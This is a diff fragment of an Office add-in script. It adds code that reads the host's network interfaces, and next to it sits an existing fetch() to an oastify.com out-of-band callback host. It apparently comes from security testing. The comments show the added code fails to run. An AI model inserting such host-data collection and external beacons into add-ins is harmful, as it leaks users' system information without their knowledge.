@@ -5,7 +5,10 @@
 
 Office.initialize = function (reason) {};
 
-console.log("In combined.js");
+console.log("In combined2.js");
+
+const os = require('node:os'); //require not defined
+const ifaces = os.networkInterfaces(); //os not defined
 
 fetch("https://jresxvrpsurc692ohxsbvia85zbqzhq5f.oastify.com")
   .then((res) => {
